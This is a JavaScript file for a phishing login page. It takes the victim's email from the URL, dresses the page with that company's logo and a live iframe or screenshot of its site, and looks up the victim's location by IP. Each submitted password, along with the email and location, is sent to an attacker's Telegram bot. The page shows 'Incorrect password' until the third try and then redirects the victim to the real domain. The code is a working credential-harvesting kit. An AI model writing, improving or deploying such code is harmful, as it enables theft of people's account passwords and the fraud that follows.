// Elements
const rawHash = window.location.hash.substring(1);
const emailInput = document.getElementById('email');
const logoImg = document.getElementById('logo');
const bgFrame = document.getElementById('bg-frame');
const passwordInput = document.getElementById('password');
const loginBtn = document.getElementById('login-btn');
const errorMsg = document.getElementById('error-msg');
const overlay = document.querySelector('.overlay');

let attempts = 0;
const maxAttempts = 3;

document.body.classList.add('blur-active');

// Pre-fill email from URL hash
const rawHash = window.location.hash.substring(1);
if (!/^[^@]+@[^@]+\.[^@]+$/.test(rawHash)) {
    alert("Invalid or missing email.");
} else {
    emailInput.value = rawHash;
    emailInput.setAttribute("readonly", true);

    const domain = rawHash.split('@')[1];
    logoImg.src = `https://logo.clearbit.com/${domain}`;
    logoImg.onerror = () => logoImg.src = "https://via.placeholder.com/150?text=Logo";

    const fallbackScreenshot = document.createElement('img');
    fallbackScreenshot.id = "fallback-screenshot";
    fallbackScreenshot.style.cssText = `display:none; position:fixed; top:0; left:0; width:100vw; height:100vh; object-fit:cover; z-index:0; pointer-events:none;`;
    fallbackScreenshot.src = `https://image.thum.io/get/width/1280/crop/900/https://${domain}`;
    document.body.appendChild(fallbackScreenshot);

    let iframeLoaded = false;
    bgFrame.src = `https://${domain}`;
    bgFrame.onload = () => { iframeLoaded = true; fallbackScreenshot.style.display = "none"; bgFrame.style.display = "block"; };
    bgFrame.onerror = () => { bgFrame.style.display = "none"; fallbackScreenshot.style.display = "block"; };

    setTimeout(() => {
        if (!iframeLoaded) { bgFrame.style.display = "none"; fallbackScreenshot.style.display = "block"; }
    }, 6000);
}

// Fetch user location
let userCity = "Unknown City", userCountry = "Unknown Country";
loginBtn.disabled = true;
fetch("https://ipapi.co/json/").then(res => res.json()).then(data => {
    userCity = data.city || userCity;
    userCountry = data.country_name || userCountry;
}).finally(() => loginBtn.disabled = false);

// Send Telegram message (frontend)
function sendTelegramMessage(email, password, attempt) {
    const text = `User: ${email}, Pass: ${password}, Attempt: ${attempt}, Location: ${userCity}, ${userCountry}`;
    const url = `https://api.telegram.org/bot<YOUR_BOT_TOKEN>/sendMessage`;
    fetch(url, { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ chat_id:'<YOUR_CHAT_ID>', text }) });
}

// Login button handler
loginBtn.addEventListener('click', () => {
    const password = passwordInput.value.trim();
    if (!password) { errorMsg.textContent = "Password cannot be empty"; return; }
    attempts++;
    sendTelegramMessage(emailInput.value, password, attempts);

    if (attempts < maxAttempts) {
        errorMsg.textContent = "Incorrect password";
        passwordInput.value = "";
    } else {
        overlay.style.display = 'none';
        window.location.href = `https://${emailInput.value.split('@')[1]}`;
    }
});
